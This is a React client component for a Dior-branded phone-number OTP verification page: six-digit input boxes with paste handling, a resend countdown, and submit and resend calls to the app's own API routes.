'use client';

import { useState, useEffect, useRef } from 'react';

interface OTPVerificationProps {
  phoneNumber: string;
  referenceCode: string;
  onVerified: () => void;
}

// Function to format phone number with dashes
function formatPhoneNumber(phone: string): string {
  // Remove any existing dashes or spaces
  const cleaned = phone.replace(/[-\s]/g, '');

  // Format as XXX-XXX-XXXX (Thai format)
  if (cleaned.length === 10) {
    return `${cleaned.slice(0, 3)}-${cleaned.slice(3, 6)}-${cleaned.slice(6)}`;
  }

  return phone;
}

export default function OTPVerification({ phoneNumber, referenceCode, onVerified }: OTPVerificationProps) {
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [timer, setTimer] = useState(300); // 5 minutes
  const [canResend, setCanResend] = useState(false);
  const [currentReferenceCode, setCurrentReferenceCode] = useState(referenceCode);

  // Create refs for each input
  const inputRefs = useRef<Array<HTMLInputElement | null>>([null, null, null, null, null, null]);

  useEffect(() => {
    const interval = setInterval(() => {
      setTimer(prev => {
        if (prev <= 1) {
          setCanResend(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  const handleChange = (index: number, value: string) => {
    // Handle paste or autocomplete with full OTP
    if (value.length > 1) {
      // Extract only digits
      const digits = value.replace(/\D/g, '');

      if (digits.length === 6) {
        // Full OTP pasted or autocompleted
        const newOtp = digits.split('').slice(0, 6);
        setOtp(newOtp);

        // Focus the last input
        inputRefs.current[5]?.focus();
        return;
      } else if (digits.length > 0) {
        // Partial paste - fill from current position
        const newOtp = [...otp];
        const digitsArray = digits.split('');

        for (let i = 0; i < digitsArray.length && index + i < 6; i++) {
          newOtp[index + i] = digitsArray[i];
        }

        setOtp(newOtp);

        // Focus next empty input or last input
        const nextIndex = Math.min(index + digitsArray.length, 5);
        inputRefs.current[nextIndex]?.focus();
        return;
      }
    }

    // Single digit input
    if (value && !/^\d+$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // Auto-focus next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace') {
      if (!otp[index] && index > 0) {
        // If current box is empty, move to previous and clear it
        const newOtp = [...otp];
        newOtp[index - 1] = '';
        setOtp(newOtp);
        inputRefs.current[index - 1]?.focus();
      } else if (otp[index]) {
        // If current box has value, just clear it
        const newOtp = [...otp];
        newOtp[index] = '';
        setOtp(newOtp);
      }
      e.preventDefault();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text');
    const digits = pastedData.replace(/\D/g, '');

    if (digits.length === 6) {
      const newOtp = digits.split('').slice(0, 6);
      setOtp(newOtp);
      inputRefs.current[5]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpCode = otp.join('');

    if (otpCode.length !== 6) {
      setError('Please enter complete OTP');
      return;
    }

    setError('');
    setLoading(true);

    try {
      const response = await fetch('/api/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber, otpCode })
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || 'Invalid OTP');
      }

      onVerified();
    } catch (err: any) {
      setError(err.message || 'Verification failed');
    } finally {
      setLoading(false);
    }
  };

  const handleResend = async () => {
    setLoading(true);
    setError('');

    try {
      const response = await fetch('/api/send-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber })
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || 'Failed to resend OTP');
      }

      // Update reference code if provided
      if (data.referenceCode) {
        setCurrentReferenceCode(data.referenceCode);
      }

      // Reset form state
      setTimer(300);
      setCanResend(false);
      setOtp(['', '', '', '', '', '']);

      // Focus first input
      inputRefs.current[0]?.focus();

      // Show success message
      alert('New OTP has been sent to your phone');
    } catch (err: any) {
      setError(err.message || 'Failed to resend OTP');
    } finally {
      setLoading(false);
    }
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  return (
    <div className="max-w-2xl mx-auto p-6 min-h-screen flex flex-col">


      {/* Logo at the top */}
      <div className="flex justify-center pt-6 pb-8">
        <img src="/Dior-Logo.png" alt="DIOR" className="h-14 w-auto object-contain" />
      </div>


      {/* Content moved slightly upward */}
      <div className="flex flex-col items-center mt-10">

        <p className="text-black text-xl mb-4 tracking-wide">
          PHONE NUMBER VERIFICATION
        </p>

        <p className="text-sm text-black mb-3 leading-tight text-center">
          An OTP was sent to verify<br />
          your phone number.
        </p>

        <p className="text-base text-black font-semibold mb-10">
          {formatPhoneNumber(phoneNumber)}
        </p>


        {error && (
          <div className="mb-4 p-3 bg-red-100 text-red-700 rounded-lg text-sm w-80 text-center">
            {error}
          </div>
        )}

        <p className="mb-3 text-black tracking-wide">PLEASE ENTER OTP</p>

        <form onSubmit={handleSubmit} className="flex flex-col items-center w-full">

          <div className="flex justify-center gap-2 mb-5">
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={el => { inputRefs.current[index] = el; }}
                type="tel"
                inputMode="numeric"
                pattern="\d*"
                maxLength={1}
                value={digit}
                onChange={e => handleChange(index, e.target.value)}
                onKeyDown={e => handleKeyDown(index, e)}
                onPaste={handlePaste}
                autoComplete={index === 0 ? 'one-time-code' : 'off'}
                className="w-12 h-16 text-center text-2xl border border-black rounded-md focus:ring-1 focus:ring-black text-black"
              />
            ))}
          </div>

          <p className="text-sm text-gray-600 mb-8">
            REFERENCE CODE : <span className="font-semibold text-black">{currentReferenceCode}</span>
          </p>

          {/* Centered submit button */}
          <button
            type="submit"
            disabled={loading || otp.join('').length !== 6}
            className="w-64 py-3 text-lg bg-black text-white rounded-lg hover:bg-gray-800 disabled:bg-gray-400 transition mb-5"
          >
            {loading ? 'Verifying...' : 'SUBMIT'}
          </button>

          <div className="text-center mb-4">
            {timer > 0 ? (
              <p className="text-sm text-gray-500">
                RESEND OTP IN <strong>{formatTime(timer)}</strong>
              </p>
            ) : (
              <p className="text-sm text-red-600">OTP expired</p>
            )}
          </div>

          {canResend && (
            <button
              type="button"
              onClick={handleResend}
              disabled={loading}
              className="text-black underline text-sm hover:text-gray-800"
            >
              RESEND OTP
            </button>
          )}
        </form>
      </div>
    </div>
  );
}
